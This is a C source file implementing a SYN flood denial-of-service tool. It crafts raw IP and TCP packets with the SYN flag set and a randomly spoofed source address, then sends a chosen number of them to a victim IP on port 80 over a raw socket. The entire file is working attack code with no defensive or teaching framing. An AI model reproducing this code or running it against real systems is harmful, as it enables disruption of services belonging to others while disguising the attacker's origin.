#include "synflood.h" 
unsigned short csum(unsigned short *ptr,int n) {
    //Simple checksum, add all bit and return a short for cs
    register long sum;
    unsigned short oddbyte;
    register short cs;
    
    sum=0;
    //add each pair to sum 
    while(n>1) {
        sum+=*ptr++;
        n-=2;
    }
    //if there only 1 value left, set Oddbye
    if(n==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
    //parse it into a 2 byte format.
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    return((short)~sum);
}
 
void createIPHeader(char source_ip[32], struct sockaddr_in *sin) {
    //Fill in the IP Header
    iph->ihl = 5;               //IP header length is 5
    iph->version = 4;           //version is 4
    iph->tos = 0;               //Type of Service 
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr); //total length
    iph->id = htons(54321);     //random ID for packet
    iph->frag_off = 0;          //fragment offset
    iph->ttl = 255;             //Time to live  
    iph->protocol = IPPROTO_TCP;//specify TCP protocl 
    iph->saddr = inet_addr ( source_ip );    //source ip address
    iph->check = 0;             //Initial value for check sum
    iph->daddr = sin->sin_addr.s_addr;
    //calculate and set checksum
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
}

void createTCPHeader(struct pseudo_header psh,struct sockaddr_in sin) {
    //TCP header
    tcph->source = htons (1234);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* first and only tcp segment */
    //all flag is set to 0 except syn flag.
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    //psh: for checksum, taken some parameters from IP header.
     
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
     
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
     
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
}

void randSIP(char source_ip[32]) {
    int a[4];
    int i;
    //random 4 number between 1 and 255.
    for (i=0; i<4; i++) {
        a[i]=1+(int) (255.0*rand()/(RAND_MAX+1.0));
    }
    sprintf(source_ip, "%i.%i.%i.%i\0", a[0], a[1], a[2], a[3]);
}

int synFlood(char victimIP[32], int packet)
{
    struct sockaddr_in sin;
    struct pseudo_header psh;
    int sent=0;
    int i;
    
    //Create a raw socket
    int sock = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

    sin.sin_family = AF_INET;
    sin.sin_port = htons(0);
    sin.sin_addr.s_addr = inet_addr (victimIP);
    for (i=0; i<packet; i++) {
        
         
        memset (datagram, 0, 4096);
        //create Fake random IP address and fill in IP, TCP header
        randSIP(source_ip);
        createIPHeader(source_ip, &sin);     

        createTCPHeader(psh,sin);

         
        //IP_HDRINCL to tell the kernel that headers are included in the packet
        int one = 1;
        const int *val = &one;
        if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
        {
            printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
            exit(0);
        }
            //Send the packet
            if (sendto (sock,      
                        datagram,   /* the buffer containing headers and data */
                        iph->tot_len,    /* total length of our datagram */
                        0,      /* routing flags, normally always 0 */
                        (struct sockaddr *) &sin,   /* socket addr, just like in */
                        sizeof (sin)) < 0)       /* a normal send() */
            {
                sent+=0;
            }
            //Data send successfully
            else
            {
                
                sent+=1;
            }
    }
    printf("%d packet Sent successfully \n",sent); 
    return sent;
}